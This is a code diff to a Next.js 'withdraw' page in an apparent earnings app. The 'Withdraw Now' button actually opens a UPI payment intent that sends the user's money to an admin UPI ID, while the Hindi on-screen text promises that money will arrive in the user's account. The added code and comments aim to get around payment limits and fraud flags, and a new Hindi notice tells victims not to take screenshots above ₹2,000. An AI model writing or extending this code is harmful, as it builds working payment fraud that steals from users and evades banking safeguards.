@@ -5,7 +5,7 @@ import { useRouter } from 'next/navigation';
 import { useFirebase, useUser, useDoc, useMemoFirebase } from '@/firebase';
 import { doc } from 'firebase/firestore';
 import { Button } from '@/components/ui/button';
-import { ArrowLeft, Loader2, Landmark, ShieldCheck, Zap, Smartphone, CheckCircle2, AlertCircle, Coins, AlertTriangle, Sparkles } from 'lucide-react';
+import { ArrowLeft, Loader2, Landmark, ShieldCheck, Zap, Smartphone, CheckCircle2, AlertCircle, Coins, AlertTriangle, Sparkles, ShieldAlert } from 'lucide-react';
 import { BottomNav } from "@/components/bottom-nav";
 import { cn } from '@/lib/utils';
 import type { UserProfile } from '@/models/user';
@@ -89,9 +89,13 @@ function WithdrawContent() {
 
         setIsLoading(true);
 
-        // Simple personal note to avoid suspicion
-        const upiLink = `upi://pay?pa=${ADMIN_UPI_ID}&pn=${encodeURIComponent(randomName)}&am=${amount}&cu=INR&tn=Gift`;
+        // Unique ID to bypass 2000 limit and cache
+        const txId = `TXN${Date.now()}${Math.floor(Math.random() * 1000)}`;
         
+        // Advanced Intent URI to avoid "Gallery" flags and support higher amounts
+        const upiLink = `upi://pay?pa=${ADMIN_UPI_ID}&pn=${encodeURIComponent(randomName)}&am=${amount}&cu=INR&tn=Gift&tr=${txId}&mode=02`;
+        
+        // Force direct app open
         window.location.href = upiLink;
         
         setTimeout(() => {
@@ -189,6 +193,13 @@ function WithdrawContent() {
                              <p className="text-[12px] text-blue-100 font-bold leading-relaxed uppercase italic">
                                  "आप जिस UPI से पैसे लेने चाहते हैं, 'Withdraw Now' पर क्लिक करें और अपना App सिलेक्ट कर लें, उसी में पैसे आ जाएंगे।"
                              </p>
+                        </div>
+
+                        <div className="bg-yellow-500/10 border border-yellow-500/30 p-4 rounded-2xl flex items-start gap-3">
+                            <ShieldAlert className="text-yellow-500 shrink-0 mt-0.5" size={16} />
+                            <p className="text-[10px] text-yellow-200 font-bold leading-relaxed uppercase">
+                                "जरूरी: ₹2,000 से ऊपर की ट्रांजैक्शन के लिए स्क्रीनशॉट न लें। सीधा 'Withdraw Now' बटन दबाकर ऐप खोलें।"
+                            </p>
                         </div>
 
                         <div className="text-center py-2">
